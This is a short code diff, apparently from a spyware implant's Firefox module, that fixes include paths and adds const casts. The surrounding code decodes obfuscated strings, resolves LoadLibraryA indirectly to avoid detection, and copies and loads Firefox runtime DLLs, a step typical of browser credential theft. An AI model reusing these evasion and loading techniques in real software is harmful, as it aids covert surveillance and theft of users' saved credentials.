@@ -7,10 +7,10 @@
 //
 //
 //#include <userenv.h>
-#include "../HM_SafeProcedures.h"
-#include "../demo_functions.h"
-#include "../common.h"
-#include "../strings.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/demo_functions.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/strings.h"
 #include <json/JSON.h>
 #include <json/JSONValue.h>
 
@@ -140,7 +140,7 @@ HMODULE libmsvcrt = NULL;
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
 #define ALPHABET_LEN 64
-char *DeobStringA(char *string)
+char *DeobStringA(const char *string)
 {
 	char alphabet[ALPHABET_LEN]={'_','B','q','w','H','a','F','8','T','k','K','D','M',
 		                         'f','O','z','Q','A','S','x','4','V','u','X','d','Z',
@@ -162,7 +162,7 @@ char *DeobStringA(char *string)
 	return ret_string;
 }
 
-WCHAR *DeobStringW(WCHAR *string)
+WCHAR *DeobStringW(LPCWSTR string)
 {
 	WCHAR alphabet[ALPHABET_LEN]={L'_',L'B',L'q',L'w',L'H',L'a',L'F',L'8',L'T',L'k',L'K',L'D',L'M',
 		                          L'f',L'O',L'z',L'Q',L'A',L'S',L'x',L'4',L'V',L'u',L'X',L'd',L'Z',
@@ -216,7 +216,7 @@ HMODULE CopyAndLoadDLL(WCHAR *src, char *dest)
 {
 	LoadLibrary_t pLoadLibrary;
 
-	pLoadLibrary = (LoadLibrary_t) HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+	pLoadLibrary = (LoadLibrary_t) HM_SafeGetProcAddress(GetModuleHandle("kernel32.dll"), (char*)"LoadLibraryA");
 	if (!pLoadLibrary) 
 		return NULL;
 
@@ -242,7 +242,7 @@ void FireFoxInitFunc()
 
 	if (!libmsvcrt && GetModuleHandle("msvcr100.dll") == NULL) {
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, "msvcr100.dll");
-		HM_CompletePath("msvcr100.dll", destPath);
+		HM_CompletePath((char *)"msvcr100.dll", destPath);
 		libmsvcrt = CopyAndLoadDLL(loadPath, destPath);
 	}
 
